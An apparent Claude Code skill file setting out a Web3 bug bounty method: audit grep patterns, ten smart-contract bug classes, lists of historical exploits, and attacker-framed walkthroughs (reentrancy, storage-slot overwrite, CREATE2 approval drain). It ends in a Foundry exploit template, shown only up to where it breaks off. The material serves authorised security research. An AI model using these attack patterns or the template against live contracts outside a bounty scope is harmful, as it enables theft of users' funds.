---
name: web3
description: Comprehensive Web3 bug bounty hunting methodology. Hunter mindset, bug validation template, 10 attacker questions per function, 10 bug classes with grep patterns (accounting desync 28%, access control 19%, incomplete paths 17%, off-by-one, oracle, ERC4626, reentrancy, flash loans, signature replay, proxy/upgrade), 10-block grep arsenal, protocol-specific patterns, 2025 new patterns, Trail of Bits and SlowMist research methodologies, and MCP tooling for Claude Code. Use when hunting any DeFi/Web3 protocol.
argument-hint: "[protocol name, scope URL, or contract path]"
allowed-tools: Bash, Read, Glob, Grep
---

# WEB3 BUG BOUNTY HUNTING — COMPLETE METHODOLOGY

---

## PART 1: HUNTER MINDSET

**Core question:** What can I STEAL, FREEZE, or DESTROY — and what do I END UP WITH?

### Bug Validation Template (Apply Before Any PoC Work)
```
I am an attacker. I will:
1. SETUP:   What do I need? (wallet, capital, any whitelisted permissions?)
2. CALL:    Exact transactions, exact order, exact function names
3. RESULT:  What do I end up with that I didn't start with?
4. COST:    Gas + capital + flash loan fee + any other expense
5. DETECT:  Can anyone stop or reverse this?
6. NET ROI: I gained X at cost of Y. Is Y << X?

If you can't fill in steps 2 and 3 → it's not a real bug. STOP. Move on.
```

### 10 Attacker Questions Per External Function
1. What if `amount = 0`? Does anything revert or silently pass?
2. What if I call this function twice in the same block?
3. What if I call this before `initialize()` is called?
4. What if I front-run this transaction?
5. What if the external call fails? Does state get half-updated?
6. What if the token has fee-on-transfer? Does `amount received ≠ amount sent`?
7. What if I pass `address(0)` or a malicious contract as an address param?
8. What if I pass `type(uint256).max` as a numeric param?
9. Can I combine this with a flash loan? (zero-cost capital changes the math)
10. **Does a sibling function lack the same modifier this function has?**

> Question #10 explains 19% of all Critical findings. If `vote()` has `onlyRole(VOTER)`, check `poke()`, `reset()`, `harvest()` — the missing modifier IS the bug.

### 6 Triager Counter-Questions (Disprove Your Own Finding)
1. Is there an upstream check I missed that actually prevents this?
2. Is this documented intended behavior (whitepaper, NatSpec, design decision)?
3. Does exploitation require admin/privileged access? (Usually invalid)
4. Is the economic cost to exploit greater than the gain?
5. Was this flagged in a prior audit as "acknowledged" or "risk accepted"?
6. Is the "sensitive" data already publicly visible in the web UI?

**One YES = KILL. Move on.**

### Workflow Rules
- **5-Minute Rule:** If stuck on same function 5 min with no attack path → STOP. Add to low-priority list.
- **Depth Over Breadth:** One protocol for 3-5 days > ten protocols in a week.
- **Inconsistency Is Proof:** `functionA()` has check, `functionB()` doesn't → THAT IS THE REPORT.

---

## PART 2: TARGET SCORING

**Score < 6 → skip.**

| Criterion | Points | How to Check |
|---|---|---|
| Max bounty ≥ $50K | +2 | Immunefi program page |
| TVL > $1M | +2 | DeFiLlama |
| Program launched < 30 days ago | +2 | Immunefi "new" filter |
| Custom math (AMM/vault/lending) | +1 | Read scope contracts |
| Recent code changes | +1 | `git log --oneline -20` |
| Prior audits available to study | +1 | Program page / GitHub |
| In-scope includes smart contracts | +1 | Scope section |
| Protocol type you know well | +1 | Your specialization |
| Source code public/readable | +1 | GitHub / Etherscan verified |

---

## PART 3: 30-MINUTE RECON PROTOCOL

### Step 1 — Immunefi Page (5 min)
```
Note:
- ALL in-scope contract addresses + GitHub links
- Out-of-scope list (DO NOT report these)
- Primacy of Impact: YES/NO
- Max bounty amounts by severity
- Time on Immunefi (newer = fewer duplicates)
```

### Step 2 — Clone + Setup (5 min)
```bash
git clone <target-repo>
cd <target-repo>
git log --oneline -20       # Recent changes = freshest bugs
forge build                 # Must compile clean
forge test                  # Note failures
forge coverage              # Untested code = priority review
```

### Step 3 — Read ALL Prior Audit Reports (15 min)
```
For each finding, note status:
  Fixed → Skip
  Acknowledged / Risk Accepted → ⚡ START HERE ⚡
    Developer knows but chose not to fix.
    Variants, escalations, related paths = in-scope and uncovered.
  Partially Fixed → Verify ALL attack paths are closed

Find: GitHub repo, protocol docs, Immunefi page, Google "[protocol] audit report"
```

### Step 4 — Crown Jewels (2 min)
```
"Worst thing an attacker could do?"
Work backward from impact to code:
- "Steal deposits" → withdrawal functions, access control on transfer
- "Mint infinite tokens" → mint functions, who calls them, what checks
- "Freeze all funds" → emergency functions, time locks, role assignments
- "Steal all rewards" → reward distribution, distributor role, harvest functions
```

### Step 5 — Architecture + Fund Flow (3 min)
```
Draw money flow:
  User USDC → deposit() → [Protocol Vault] → [External Protocol (Aave/Compound)]
                                           → yield accumulates
  [Reward Distributor] → Users via claim/harvest

Find WHERE VALUE ACCUMULATES. That contract = highest priority.

Key state variables:
- Total deposited / total assets / total shares
- Per-user balance tracking (how is it updated?)
- Reward accumulator (index, per-share, per-second?)
- Role assignments (owner, admin, governance, distributor)
- Time locks (timestamps, epochs, cooldowns)
```

### Step 6 — Static Analysis (5 min)
```bash
slither . --exclude-low --filter-paths "test|lib|node_modules"
aderyn . --output report.md
# Note HIGH/CRITICAL only. Tools catch ~30-40% of bugs.
```

---

## PART 4: 10 BUG CLASSES (Sorted by Frequency)

### Bug Class 1: Accounting State Desynchronization (28% of Criticals)
> Value is received or withdrawn but internal accounting isn't updated to match.

**4 Variants:**
1. **Phantom Yield:** Protocol counts rewards before they exist → user claims before accrual
2. **Fast Path Skips State Update:** `repayMax()` skips `_update()` that normal `repay()` calls
3. **Rewards to Wrong Accumulator:** Different accumulator updated for same pool → imbalance
4. **Wrong Update Order:** Balance updated after interest calculation → uses stale balance

**Grep:**
```bash
grep -rn "totalSupply\|totalShares\|totalAssets\|totalBorrow" contracts/ -A5
# Find: does every function that changes value ALSO update these?
grep -rn "function.*withdraw\|function.*deposit\|function.*repay\|function.*borrow" contracts/ -A20
# Manual: compare state updates across similar functions
```

---

### Bug Class 2: Access Control (19% of Criticals, $953M in 2024)
> Function can be called by attacker that should be restricted.

**5 Variants:**
1. **Missing modifier on sibling function:** `vote()` has `onlyVoter`, `poke()` doesn't
2. **Wrong check (existence vs ownership):** `require(balances[token] > 0)` instead of `require(owner[token] == msg.sender)`
3. **Tautology in require:** `require(role == ADMIN || role != ADMIN)` — always true
4. **Silent modifier (`if` instead of `require`):** Modifier uses `if` → silently does nothing instead of reverting
5. **Uninitialized proxy:** `initialize()` not called on implementation → anyone calls it

**Grep:**
```bash
grep -rn "function.*external\|function.*public" contracts/ | grep -v "view\|pure"
# Count: compare vs. functions with modifiers
grep -rn "modifier\b" contracts/ -A5 | grep "if ("
# Red flag: modifier uses if instead of require
grep -rn "function initialize\b" contracts/ -A5
grep -rn "_disableInitializers()" contracts/
```

**Roles Audit Checklist:**
```bash
grep -rn "onlyOwner\|onlyRole\|onlyAdmin\|onlyGov" contracts/ | sort | uniq
grep -rn "AccessControl\|Ownable\|hasRole" contracts/
grep -rn "grantRole\|revokeRole\|transferOwnership" contracts/
# Map: who can assign each role? Can attacker reach these?
```

---

### Bug Class 3: Incomplete Code Path (17% of Criticals)
> Operation partially executes — state updated for part A but not part B.

**5 Variants:**
1. **Update without refund:** Cancel() deletes order but doesn't return tokens
2. **Partial fill token stuck:** Unfilled portion stays in contract with no claim mechanism
3. **Queue entry deleted on failure:** Message deleted from queue even when execution fails
4. **SafeApprove without cleanup:** `safeApprove` fails if previous approval non-zero
5. **Mint skips receipt check:** `mint()` doesn't verify shares received match deposit

**Grep:**
```bash
grep -rn "function update_\|function cancel\|function refund\|function remove\|function delete" contracts/ -A15
# Manual: does the function update ALL relevant state variables?
grep -rn "function.*Order\|function.*Position\|function.*Bid\|function.*Offer" contracts/ -A20
# Pattern: compare cancel/remove against create — same state vars touched?
```

---

### Bug Class 4: Off-by-One & Boundary Conditions (22% of Highs)
> Wrong side of `<` vs `<=`, wrong period start/end, loop runs extra or one less iteration.

**6 Boundary Locations:**
1. Period/epoch: start vs end, inclusive vs exclusive
2. Time-based locks: `block.timestamp > unlockTime` vs `>= unlockTime`
3. Loop break: `i < length` vs `i <= length`
4. Array index: 0-indexed off-by-one
5. Amount/balance: `> 0` vs `>= minAmount`
6. Rounding: floor vs ceiling, favor protocol or user

**Mental Test:** For every `<`, `<=`, `>`, `>=`:
- What if the value is EXACTLY the boundary?
- What if it's one above or below?

**Grep:**
```bash
grep -rn "period\|epoch\|round.*[<>][^=]" contracts/
grep -rn "block\.timestamp.*[<>][^=]\|[<>][^=].*block\.timestamp" contracts/
grep -rn "\.length - 1\b\|i < length\|i <= length" contracts/
```

---

### Bug Class 5: Oracle / Price Manipulation (12% of Criticals)
> Protocol reads manipulable price source → attacker controls price used for calculation.

**Chainlink Bugs:**
```solidity
// A: Missing staleness check
(,int price,,uint updatedAt,) = oracle.latestRoundData();
require(block.timestamp - updatedAt < 1 hours, "Stale price");  // REQUIRED

// B: Missing sequencer check (L2 deployments)
// If sequencer is down, Chainlink data is stale — feeds don't update
// Must check sequencer uptime feed separately

// C: latestAnswer() deprecated — use latestRoundData() + staleness check
```

**Pyth Bugs:**
```solidity
// Confidence interval too wide = price range is unreliable
require(price.conf * 10 < uint64(price.price), "Low confidence");
// Hardcoded staleness threshold: use dynamic based on asset volatility
```

**AMM Spot Price (Most Dangerous):**
```solidity
// VULNERABLE: flash-loan manipulable
(uint112 r0, uint112 r1,) = pair.getReserves();  // Uniswap V2
uint160 sqrtPriceX96 = slot0.sqrtPriceX96;        // Uniswap V3

// SAFE: use TWAP
uint32[] memory secondsAgo = new uint32[](2);
secondsAgo[0] = 1800; secondsAgo[1] = 0;
(int56[] memory tickCumulatives,) = pool.observe(secondsAgo);
// Compute time-weighted price from tick cumulatives
```

**Grep:**
```bash
grep -rn "latestRoundData\|latestAnswer\|getReserves\|slot0\b" contracts/
grep -rn "sequencerUptimeFeed\|answeredInRound\|roundId" contracts/
grep -rn "\.conf\b\|confidence" contracts/
```

---

### Bug Class 6: ERC4626 Vault Bugs
> Share price, deposit/withdrawal rounding, and direct token donations create attack vectors.

**4 Core Bugs:**
1. **First depositor inflation:** 1-wei + donate → victim gets 0 shares
2. **Share transfer missing stake migration:** `transfer()` moves shares but not staking position
3. **Rounding direction:** Deposits must round DOWN (fewer shares to user), withdrawals round UP (more assets required from user)
4. **Donation attack:** Direct `token.transfer()` to vault inflates `totalAssets` → share price jumps

**Vault Checklist:**
```bash
grep -rn "convertToShares\|convertToAssets\|previewDeposit\|previewWithdraw" contracts/
grep -rn "totalAssets()\|_totalAssets\b" contracts/
# Check: is totalAssets() using balanceOf(this) (vulnerable) or tracked var (safe)?
grep -rn "\.balanceOf(address(this))" contracts/
# If used for accounting = donation attack vector
```

---

### Bug Class 7: Reentrancy ($300M+ all-time, $35.7M in 2024)
> External call before state update → attacker re-enters and exploits inconsistent state.

**4 Variants:**
1. **Classic CEI violation:** `.call{value}()` before state update
2. **Cross-function:** `nonReentrant` on `withdraw()` but not `claim()` — shared state
3. **Read-only ($70M Curve):** View function reads stale state during callback (ERC777 hook)
4. **Cross-contract:** Protocol A calls Protocol B which calls back into Protocol A

**Grep:**
```bash
grep -rn "\.call{value\|\.transfer(\|safeTransfer\|safeTransferFrom" contracts/ -B5
# Check: state variables updated AFTER these calls = vulnerable
grep -rn "nonReentrant" contracts/
# Missing on functions that share storage with nonReentrant functions = cross-function reentrancy
```

---

### Bug Class 8: Flash Loan Attacks (83% of eligible exploits use flash loans)
> Zero-cost capital enables attacks that would otherwise be economically infeasible.

**3 Flash Loan Patterns:**
1. **Oracle manipulation:** Borrow → dump one side of pair → read manipulated price → profit → repay
2. **Governance attack:** Borrow tokens → vote on proposal → execute → repay (all in 1 tx)
3. **Liquidity manipulation:** Borrow from protocol's own pool → distort reserves → self-trade

**Flash Loan Providers (sorted by cost):**
```
Balancer V2:    0% fee — Vault.flashLoan(receiver, tokens, amounts, userData)
Morpho:        ~0% fee — flashLoan(token, amount, data)
Aave V3:       0.05% fee — flashLoan(receiver, assets, amounts, modes, params, referral)
Uniswap V2:    0.3%  fee — pair.swap(amount0, amount1, to, data) — callback uniswapV2Call
```

**Checklist:**
```bash
grep -rn "latestRoundData\|getReserves\|slot0\b" contracts/
# Any spot price read = flash loan attack surface
grep -rn "governance\|vote\|proposal\|quorum" contracts/
# Governance token borrowed in flash loan = voting power manipulation
grep -rn "flashLoan\|flash_loan\|onFlashLoan\|uniswapV2Call\|pancakeCall" contracts/
# Is protocol itself a flash loan provider? Can it be used to attack itself?
```

---

### Bug Class 9: Signature Replay
> Signed messages reused across chains, contracts, or time windows.

**3 Variants:**
1. **Cross-chain:** Signature without chainId → replay on Ethereum + Arbitrum + Optimism
2. **Same-chain replay:** No nonce → same signature reusable indefinitely
3. **EIP-2612 Permit Frontrun DoS:** Attacker sees permit in mempool, frontruns → nonce consumed → victim reverts

**Signature Checklist:**
```
□ Does signature include chainId?
□ Does signature include contract address?
□ Does signature include nonce (nonces[user]++)?
□ Does signature include deadline?
□ Is OpenZeppelin ECDSA used (not raw ecrecover)?
□ Are signatures used as mapping keys? (malleability attack via s value)
□ Is permit() wrapped in try/catch in compound functions?
□ Is DOMAIN_SEPARATOR computed at runtime (not hardcoded)?
```

**Grep:**
```bash
grep -rn "ecrecover\|ECDSA\.recover" contracts/
grep -rn "chainId\|block\.chainid\|DOMAIN_SEPARATOR" contracts/
grep -rn "nonces\[\|nonce\b" contracts/
grep -rn "try.*permit\|catch.*permit" contracts/
```

---

### Bug Class 10: Proxy / Upgrade Bugs
> Uninitialized implementations, storage collisions, and unprotected upgrade paths.

**4 Variants:**
1. **Uninitialized implementation:** `initialize()` callable by anyone on impl contract directly
2. **Storage collision:** New variable added BEFORE existing ones in upgrade → overwrites
3. **UUPS without `_authorizeUpgrade` protection:** Anyone calls `upgradeTo(malicious)`
4. **Reinitializer not protected:** `reinitializer(2)` has no access control → resets state

**Proxy Checklist:**
```
□ Is _disableInitializers() in implementation constructor?
□ Does initialize() have initializer modifier?
□ Does _authorizeUpgrade() have onlyOwner/onlyRole?
□ New storage variables ONLY appended at end (no slot collision)?
□ __gap arrays reserved for future vars?
□ DOMAIN_SEPARATOR recalculated at runtime?
□ No selfdestruct calls?
```

**Grep:**
```bash
grep -rn "function initialize\b" contracts/ -A5
grep -rn "_disableInitializers()" contracts/
grep -rn "_authorizeUpgrade" contracts/ -A3
grep -rn "__gap\|ERC1967Storage" contracts/
```

---

## PART 5: 10-BLOCK GREP ARSENAL

### Block 1 — Access Control (Tier 1: highest value)
```bash
grep -rn "function.*external\|function.*public" contracts/ | grep -v "view\|pure\|returns"
grep -rn "selfdestruct\|delegatecall\|\.call(" contracts/
grep -rn "\.call(" contracts/ | grep -v "staticcall\|view\|//\|test"
```

### Block 2 — Reentrancy
```bash
grep -rn "\.call{value\|\.transfer(\|\.send(" contracts/ -B5
grep -rn "nonReentrant\|ReentrancyGuard" contracts/
grep -rn "\.call(" contracts/ -B2 | grep -v "staticcall"
```

### Block 3 — Oracle / Price
```bash
grep -rn "latestRoundData\|latestAnswer\|getReserves\b\|slot0\b\|observe(" contracts/
grep -rn "sequencerUptimeFeed\|answeredInRound\b" contracts/
grep -rn "\.price\b\|getPrice\|fetchPrice\|updatePrice" contracts/
```

### Block 4 — Arithmetic
```bash
grep -rn "unchecked {" contracts/ -A10
grep -rn "SafeMath\|\.div(\|\.mul(" contracts/
grep -rn "/ total\|/ shares\|/ supply\|/ assets" contracts/
grep -rn "\* price\|price \*\|\.price \*" contracts/
```

### Block 5 — Input Validation
```bash
grep -rn "require(" contracts/ | grep -v "msg\.sender\|balance\|amount\|onlyOwner"
grep -rn "address(0)\|require.*!= address(0)" contracts/
grep -rn "\.length == 0\|params\.length\|args\.length" contracts/
```

### Block 6 — Token Handling
```bash
grep -rn "safeTransfer\|safeTransferFrom\|transfer(" contracts/
grep -rn "\.balanceOf(address(this))\|balanceOf(this)" contracts/
grep -rn "IERC20.*transfer\|ERC20.*transferFrom" contracts/ -B2 -A2
# Check: is returned bool checked?
```

### Block 7 — ERC4626 / Vault
```bash
grep -rn "convertToShares\|convertToAssets\|previewDeposit\|previewWithdraw\|previewRedeem" contracts/
grep -rn "totalAssets()\|_totalAssets\b\|totalSupply()" contracts/
grep -rn "ERC4626\|IERC4626\|BaseVault" contracts/
```

### Block 8 — Proxy / Upgrade
```bash
grep -rn "function initialize\b\|initializer\b\|reinitializer" contracts/ -A5
grep -rn "_disableInitializers\|_authorizeUpgrade\|upgradeTo\|upgradeToAndCall" contracts/
grep -rn "UUPSUpgradeable\|TransparentUpgradeableProxy\|BeaconProxy" contracts/
```

### Block 9 — Signatures / Replay
```bash
grep -rn "ecrecover\|ECDSA\.recover\|SignatureChecker" contracts/
grep -rn "nonces\[\|nonces\.\|_useNonce\b" contracts/
grep -rn "DOMAIN_SEPARATOR\|block\.chainid\|chainId\b" contracts/
grep -rn "permit(" contracts/ | grep -v "//\|IERC20Permit\|interface"
```

### Block 10 — State Completeness
```bash
grep -rn "function cancel\|function remove\|function delete\|function close\b" contracts/ -A20
grep -rn "delete [a-z].*\[" contracts/  # Does delete update all relevant mappings?
grep -rn "pop()\|\.length--" contracts/
```

---

## PART 6: PROTOCOL-SPECIFIC PATTERNS

### Yield Aggregator
```bash
grep -rn "harvest\|compound\|reinvest\|autoCompound" contracts/ -A10
grep -rn "lastHarvest\|lastCompound\|lastUpdate" contracts/
grep -rn "pendingRewards\|claimable\|earned()" contracts/
# Check: reward index updated before every deposit/withdraw?
```

### Lending Protocol
```bash
grep -rn "liquidate\|liquidation\|isLiquidatable\|canLiquidate" contracts/
grep -rn "healthFactor\|collateralFactor\|ltv\b" contracts/
grep -rn "accrueInterest\|updateInterest\|interestRate" contracts/
# Check: is accrueInterest() called before every borrow/repay/liquidate?
```

### AMM / DEX
```bash
grep -rn "swap\|swapExact\|getAmountOut\|getAmountIn" contracts/ -A10
grep -rn "k = \|invariant\|reserve0\|reserve1\|_update(" contracts/
grep -rn "fee\|feeTo\|protocolFee" contracts/
# Check: is K preserved after swap? Any flash swap callback reentrancy?
```

### Staking / Restaking
```bash
grep -rn "stake\|unstake\|slash\|slashing\|delegate\|undelegate" contracts/
grep -rn "rewardPerToken\|rewardRate\|lastUpdateTime" contracts/
grep -rn "withdrawalQueue\|queuedWithdrawal\|pendingWithdrawal" contracts/
# Check: multi-field withdrawal queue updated atomically?
```

---

## PART 7: 2025 NEW HIGH-VALUE PATTERNS

```bash
# ERC4626 near-empty vault (first depositor inflation)
grep -rn "totalAssets()\|totalSupply()" contracts/
# If both can be 0 simultaneously → first depositor inflation

# EIP-2612 permit frontrun DoS
grep -rn "permit(" contracts/ | grep -v "try\|catch"
# Absent try/catch = vulnerable to DoS

# Decimal precision mismatch (6-decimal USDC vs 18-decimal token)
grep -rn "1e18\|1e6\|decimals()\|DECIMALS" contracts/
grep -rn "\* 1e18\|/ 1e18\|\* 10 \*\* 18" contracts/

# Streaming / continuous precision loss
grep -rn "perSecond\|ratePerSecond\|streamRate\|flowRate" contracts/

# Withdrawal queue multi-field invariant
grep -rn "withdrawalQueue\|queue\b" contracts/ -A10
# Check: all 3+ fields updated atomically (amount + timestamp + status)

# Try/catch DoS liveness
grep -rn "try\b.*catch\b" contracts/ -A5
# If try/catch swallows external call failure → operation proceeds even when it shouldn't
```

---

## PART 8: RESEARCH METHODOLOGIES

### Trail of Bits Approach
**Tools:** Slither / Echidna / Medusa / Manticore / Halmos

```bash
# Slither — fast, broad
slither . --detect all --exclude informational,optimization
slither . --detect reentrancy-eth,reentrancy-benign,unprotected-upgrade
slither-check-upgradeability . ProxyContract ImplementationContract

# Echidna — property fuzzer
# invariant_*.sol: define properties that must always hold
echidna . --contract TestContract --config echidna.yaml --test-mode assertion

# Medusa — coverage-guided fuzzer
medusa fuzz --config medusa.json

# Halmos — symbolic execution
halmos --contract MyTest --function testSymbolic
```

**6-Step ToB Audit:**
1. Manual code review (architecture + logic)
2. Slither static analysis
3. Echidna invariant testing
4. Symbolic execution on critical paths (Halmos/Manticore)
5. Test suite review (coverage + quality)
6. Report writeup

**Key Bug Classes (ToB Focus):**
- Reentrancy: classic + cross-function + read-only
- Rounding: favor attacker direction (1 wei × 1000 iterations = significant)
- Weak Fiat-Shamir (ZK): hash of public inputs doesn't bind all params
- Access control gaps: incorrect use of msg.sender vs tx.origin
- Unsafe upgrades: missing gap, storage collision
- Signature replay: missing nonce or chainId
- DeFi: liquidity math, oracle manipulation, L2 bridge trust assumptions

**"Risk Accepted" Hunt Strategy:**
1. Find all prior audits for target protocol
2. Compile every "Risk Accepted" / "Acknowledged" finding
3. For each: find variant, escalation, or related path that IS exploitable
4. These findings are pre-validated as interesting by the original auditors

### SlowMist Learning Roadmap

**Phase 1: Foundation (Weeks 1-4)**
```
Ethernaut 30 challenges (all of them)
Resources:
- SWC Registry (smartcontractsecurity.github.io/SWC-registry/)
- DeFiHackLabs (github.com/SunWeb3Sec/DeFiHackLabs)
- Rekt.news (every exploit, understand the root cause)
```

**Phase 2: DeFi & Real Hacks (Weeks 5-10)**
```
Read source code of Tier-1 protocols:
- Uniswap V2 + V3 (AMM math, flash swaps, Oracle)
- Aave V3 (collateral, liquidation, flash loans, aTokens)
- Compound V2 + V3 (cTokens, interest accrual, governance)
- ERC4626 (share math, rounding, extension patterns)

Study 10 priority exploits:
- Cream Finance ($130M) — flash loan oracle
- Euler Finance ($197M) — donation attack + liquidation math
- Nomad Bridge ($200M) — message validity check zero
- Beanstalk ($182M) — flash loan governance
- Mango Markets ($117M) — oracle price manipulation
- Curve (read-only reentrancy, $70M)
- Penpie ($27M) — reentrancy in multi-reward
- Rari Capital ($80M) — reentrancy cross-protocol
- Wormhole ($320M) — uninitialized proxy
- Ronin ($625M) — validator compromise
```

**Phase 3: EVM Internals**
```
Storage layout: slots, packing, mappings (keccak256(key . slot))
Key opcodes: SLOAD/SSTORE gas, DELEGATECALL context, STATICCALL restrictions
Proxy patterns: EIP-1967, EIP-1822 (UUPS), Transparent, Beacon, Diamond
Symbolic execution: Manticore / Halmos for path exploration
```

---

## PART 9: MCP TOOLING (CLAUDE CODE INTEGRATION)

```json
// Add to ~/.claude/mcp.json:
{
  "mcpServers": {
    "audit": {
      "command": "npx",
      "args": ["solidity-audit-mcp"]
    }
  }
}
```

**10 MCP Tools:**
```
analyze_contract(contractPath, analyzers)   — full pipeline: Slither + Aderyn + Slang
get_contract_info(contractPath)             — attack surface map (functions, payable, delegatecall)
check_vulnerabilities(contractPath, detectors) — 86 SWC pattern detectors
explain_finding(findingId, context)         — root cause + PoC + remediation for any finding
generate_invariants(contractPath, protocol) — Foundry invariant tests for vault/lending/amm
diff_audit(old, new)                        — audit only changed functions in upgrades
run_slither(contractPath, detectors)        — direct Slither run
run_aderyn(contractPath)                    — direct Aderyn run
optimize_gas(contractPath)                  — storage packing, loop, calldata suggestions
get_swc_info(swcId)                         — SWC registry entry with examples
```

**19 Built-in Finding Explainers:**
SWC-107 (Reentrancy), SWC-112 (Delegatecall untrusted callee), CUSTOM-017 (Missing access control), CUSTOM-018 (ERC-7702 unprotected initializer), CUSTOM-004 (Oracle/flash loan), CUSTOM-032 (ERC-4337 paymaster drain), SWC-101 (Integer overflow), SWC-104 (Unchecked return), SWC-115 (tx.origin), CUSTOM-001 (Array length mismatch), CUSTOM-011 (Signature without replay protection), CUSTOM-029 (Merkle double-claim), SWC-116 (Timestamp dependence), CUSTOM-005 (Zero address), CUSTOM-013 (abi.encodePacked hash collision), CUSTOM-015 (Division before multiplication), CUSTOM-016 (Permit without deadline), SWC-100 (Default visibility), SWC-103 (Floating pragma)

---

## BUG CLASS QUICK REFERENCE

| Rank | Class | % Criticals | Flash Loan? | First Grep |
|---|---|---|---|---|
| 1 | Accounting Desync | 28% | No | `totalSupply\|totalShares\|totalAssets` |
| 2 | Access Control | 19% | No | `function.*external` without modifier |
| 3 | Incomplete Path | 17% | Sometimes | `function update_\|function cancel` |
| 4 | Off-By-One | 22% Highs | No | `period\|epoch\|round.*[<>][^=]` |
| 5 | Oracle Manipulation | 12% | Yes | `latestRoundData\|getReserves\|slot0` |
| 6 | ERC4626 Vaults | Varies | Yes | `convertToShares\|totalAssets()` |
| 7 | Reentrancy | 8% | Sometimes | `\.call{value\|safeTransfer` before state |
| 8 | Flash Loan | 83% use it | Yes | Any spot price or governance vote |
| 9 | Signature Replay | 3% | No | `ecrecover\|ECDSA.recover` |
| 10 | Proxy/Upgrade | 2% | No | `function initialize\|_authorizeUpgrade` |


---

## From hack-skills: Smart Contract Vulnerability Patterns

### Reentrancy Variants

```
Classic (CEI violation):
  withdraw() → external call before state update
  → attacker re-enters withdraw() before balance zeroed

Cross-Function Reentrancy:
  withdraw() → external call (balance not zeroed)
  → attacker calls transfer() (reads stale balance)
  → both withdraw() and transfer() succeed on same balance

Read-Only Reentrancy:
  Protocol removes liquidity → callback occurs mid-state-change
  → third-party protocol reads stale intermediate price (inflated)
  → profit from miscalculated collateral/borrow amounts
  Real: Curve pool get_virtual_price() during remove_liquidity()
```

**Fix order**: Checks → Effects → Interactions (CEI) + ReentrancyGuard on all public functions.

### Integer Overflow (Pre-Solidity 0.8)

```solidity
uint8(255) + 1 == 0    // silent overflow
uint8(0) - 1 == 255    // underflow → huge balance

// Attack: balances[attacker] -= amount where amount > balance → huge balance
// Post-0.8 risk: unchecked{} blocks reintroduce overflow
// Also: (a * b) / c where a*b overflows before division
```

### Delegatecall Storage Collision

```
Proxy slot 0: owner         ← critical auth variable
Impl slot 0: someVariable   ← innocuous-seeming variable

Attacker calls implementation function that writes slot 0
→ overwrites proxy's owner → becomes proxy owner
```

**Find**: `cast selectors <bytecode>` for function selector collisions (4-byte prefix).

### tx.origin Authentication Bypass

```solidity
// Vulnerable:
require(tx.origin == owner);  // phishing contract inherits tx.origin

// Safe:
require(msg.sender == owner);
```

### Signature Replay Attacks

```
Missing nonce: same signature reused multiple times (transfer replayed)
Cross-chain replay: same contract on multiple chains, signature valid on all
  Fix: include block.chainid in EIP-712 domain separator

ecrecover returns address(0) on invalid sig → passes address(0) == owner check
  Fix: require(signer != address(0))
```

### Randomness Manipulation

```
block.timestamp: miner manipulates ±15s
blockhash(block.number-1): known at execution time
block.prevrandao: post-merge, known beacon chain value

Commit-reveal abuse: attacker refuses to reveal unfavorable outcome
  Fix: enforce reveal timeout + deposit bond
```

### CREATE2 Pre-deployment Exploitation

```
Predict contract address → approve tokens to that address before deployment
Deploy malicious contract at predicted address → drain approved tokens

Also: metamorphic contracts (pre-EIP-6780):
CREATE2 → selfdestruct → CREATE2 with same salt but DIFFERENT initCode
→ proxy approvals/state stays, but implementation is now malicious
```

### Flash Loan Attack Checklist

```
✓ Does contract use AMM spot price (getReserves()) as oracle? → vulnerable
✓ Does governance vote snapshot balance at vote time or proposal creation? → flash loan risk
✓ Does first depositor set share price that causes rounding to 0? → inflation attack
✓ Are ERC4626 vaults initialized with minimum liquidity? → inflation attack
✓ Does any external call happen before state update? → reentrancy risk
```



---

## web3-poc

# WEB3 PoC WRITING — FOUNDRY EXPLOIT TEMPLATES

---

## 7-QUESTION TRIAGE GATE (Run Before Writing ANY PoC)

Before spending hours on a PoC, answer all 7:

```
1. STEAL/FREEZE/DESTROY: What do I end up with that I didn't start with?
   → Can't answer? NOT A BUG.

2. STEPS: What are the EXACT function calls, in what order?
   → Can't list them? NOT READY. Keep reading.

3. CAPITAL: How much do I need? (Flash loan covers it if > $0)
   → If cost > reward, NOT VIABLE.

4. OUT-OF-SCOPE: Is the vulnerable contract in scope?
   → Check program scope BEFORE writing.

5. PRIOR ART: Has this been reported + paid already?
   → Check Immunefi public disclosures + prior audit reports.

6. ADMIN: Does attack require admin/privileged access?
   → If yes: USUALLY INVALID (unless owner compromise explicitly in scope).

7. TESTABILITY: Can I prove profit with assertGt(profit, 0)?
   → If no measurable profit: document as High, not Critical.
```

---

## IMMUNEFI PoC REQUIREMENTS

```
✓ Runnable Foundry fork test (not Hardhat)
✓ console.log("Before:", balance_before)
✓ console.log("After:", balance_after)
✓ assertGt(profit, 0, "Must be profitable")
✓ Pinned mainnet fork block number
✓ Realistic starting conditions (no magic initial state)
✓ One bug per report

✗ What gets rejected:
  - Hardhat/Truffle tests
  - Tests that don't demonstrate profit
  - Tests requiring admin access (unless explicitly in scope)
  - Tests on out-of-scope contracts
  - Theoretical walkthroughs without runnable test
```

---

## STANDARD PoC TEMPLATE

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Target interfaces — copy from Etherscan or project
interface IVictimProtocol {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external returns (uint256);
    function totalAssets() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// ==============================================================================
// EXPLOIT CONTRACT (deployed as attacker)
// ==============================================================================
contract Attacker {
    IVictimProtocol public immutable victim;
    IERC20 public immutable token;

    constructor(address _victim, address _token) {
        victim = IVictimProtocol(_victim);
        token = IERC20(_token);
    }

    function attack() external {
        // Step 1: Setup
        uint256 startBalance = token.balanceOf(address(this));

        // Step 2: Execute exploit
        token.approve(address(victim), type(uint256).max);
        victim.deposit(startBalance);

        // Step 3: Profit extraction
        victim.withdraw(type(uint256).max);

        // Send profits back to test
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    // Flash loan / callback receivers go here
    receive() external payable {}
}

// ==============================================================================
// TEST CONTRACT
// ==============================================================================
contract ExploitTest is Test {
    // ===== CONFIGURATION =====
    uint256 constant FORK_BLOCK = 20000000;  // Pin to specific block

    address constant VICTIM_POOL    = 0x1234...;
    address constant USDC_ADDRESS   = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH_ADDRESS   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    IVictimProtocol victim;
